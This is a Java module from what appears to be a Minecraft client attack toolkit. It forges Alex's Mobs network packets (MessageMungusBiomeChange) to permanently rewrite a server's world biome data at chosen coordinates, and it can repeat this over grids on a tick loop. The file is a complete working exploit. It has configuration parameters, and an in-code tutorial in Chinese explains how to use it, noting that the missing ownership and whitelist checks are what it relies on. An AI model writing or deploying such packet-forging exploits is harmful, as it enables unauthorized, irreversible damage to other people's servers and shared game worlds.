package com.redblue.red.modules.alexsmobs;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.resources.ResourceLocation;
import net.minecraftforge.fml.ModList;

import java.util.List;

/**
 * AM-05: Remote biome corruption via MessageMungusBiomeChange (index 5).
 *
 * Wire: writeInt(mungusId) + writeInt(posX) + writeInt(posZ) + writeUtf(biomeOption)
 *
 * Requires AMConfig.mungusBiomeTransformationType == 2 on server.
 * Distance check: entity.distanceTo(posX, entityY, posZ) < 1000 (very loose).
 * No ownership check, no biome whitelist.
 * Permanently modifies world chunk biome data.
 */
public class AM06_BiomeCorrupt implements AttackModule {

    private static final ResourceLocation CHANNEL =
            new ResourceLocation("alexsmobs", "main_channel");
    private static final int IDX_MUNGUS_BIOME = 5;

    private long lastTick = 0;

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofBool("confirm_danger",
                "⚠ 确认：将永久修改世界数据", false),
        ConfigParam.ofEntity("mungus_id", "Mungus实体"),
        ConfigParam.ofEnum("coord_source", "坐标来源",
                "CUSTOM", "CUSTOM", "PLAYER"),
        ConfigParam.ofInt("pos_x", "目标X", 0, -30000000, 30000000)
                .visibleWhen("coord_source", "CUSTOM"),
        ConfigParam.ofInt("pos_z", "目标Z", 0, -30000000, 30000000)
                .visibleWhen("coord_source", "CUSTOM"),
        ConfigParam.ofAction("fill_pos", "填充当前坐标", () -> {
            var mc = Minecraft.getInstance();
            if (mc.player != null) {
                getParam("pos_x").ifPresent(p -> p.set((int) mc.player.getX()));
                getParam("pos_z").ifPresent(p -> p.set((int) mc.player.getZ()));
            }
        }).visibleWhen("coord_source", "CUSTOM"),
        ConfigParam.ofString("biome", "生物群系",
                "minecraft:the_void"),
        ConfigParam.ofEnum("area_mode", "区域模式",
                "SINGLE", "SINGLE", "GRID_3x3", "GRID_5x5"),
        ConfigParam.ofInt("grid_spacing", "网格间距(格)", 16, 4, 64),
        ConfigParam.ofInt("interval", "自动间隔(tick)", 20, 1, 200)
    );

    @Override public String id() { return "am06_biome_corrupt"; }
    @Override public String name() { return "生物群系篡改"; }
    @Override public String description() {
        return "通过Mungus永久修改世界生物群系";
    }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
            + "1. 勾选 confirm_danger 确认你了解此操作将永久修改世界数据\n"
            + "2. 用准星对准世界中的Mungus实体，设置 mungus_id\n"
            + "3. 填写目标坐标 pos_x / pos_z\n"
            + "4. 填写目标生物群系ID（如 minecraft:plains）\n"
            + "5. 选择区域模式：SINGLE 单点、GRID_3x3 九宫格、GRID_5x5 二十五宫格\n"
            + "6. 启用后执行或自动tick循环执行\n\n"
            + "[参数说明]\n"
            + "confirm_danger - 危险确认开关，必须勾选才能执行\n"
            + "mungus_id - 用准星选取的Mungus实体\n"
            + "pos_x - 目标X坐标\n"
            + "pos_z - 目标Z坐标\n"
            + "biome - 目标生物群系ID，格式为 命名空间:名称\n"
            + "area_mode - 区域模式：SINGLE/GRID_3x3/GRID_5x5\n"
            + "grid_spacing - 网格模式下每格间距（方块数）\n"
            + "interval - 自动模式下每次执行的间隔tick数\n\n"
            + "[注意事项]\n"
            + "此操作会永久修改世界存档的生物群系数据，无法撤销，请谨慎使用\n"
            + "服务端需要 AMConfig.mungusBiomeTransformationType == 2 才能生效";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("alexsmobs");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        if (!getParam("confirm_danger").map(ConfigParam::getBool).orElse(false)) return;
        doCorrupt(mc);
    }

    @Override
    public void tick(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        if (!getParam("confirm_danger").map(ConfigParam::getBool).orElse(false)) return;
        int interval = getParam("interval").map(ConfigParam::getInt).orElse(20);
        long now = mc.level.getGameTime();
        if (now - lastTick < interval) return;
        lastTick = now;
        doCorrupt(mc);
    }

    private void doCorrupt(Minecraft mc) {
        int mungusId = getParam("mungus_id").map(ConfigParam::getInt).orElse(0);
        int baseX = getParam("pos_x").map(ConfigParam::getInt).orElse(0);
        int baseZ = getParam("pos_z").map(ConfigParam::getInt).orElse(0);
        String biome = getParam("biome").map(ConfigParam::getString)
                .orElse("minecraft:the_void");
        String areaMode = getParam("area_mode").map(ConfigParam::getString)
                .orElse("SINGLE");
        int spacing = getParam("grid_spacing").map(ConfigParam::getInt).orElse(16);

        int radius = switch (areaMode) {
            case "GRID_3x3" -> 1;
            case "GRID_5x5" -> 2;
            default -> 0;
        };

        for (int dx = -radius; dx <= radius; dx++) {
            for (int dz = -radius; dz <= radius; dz++) {
                int x = baseX + dx * spacing;
                int z = baseZ + dz * spacing;
                sendBiomeChange(mungusId, x, z, biome);
            }
        }
    }

    private void sendBiomeChange(int mungusId, int x, int z, String biome) {
        PacketForge.send(CHANNEL, buf -> {
            buf.writeByte(IDX_MUNGUS_BIOME);
            buf.writeInt(mungusId);
            buf.writeInt(x);
            buf.writeInt(z);
            buf.writeUtf(biome);
        });
    }
}
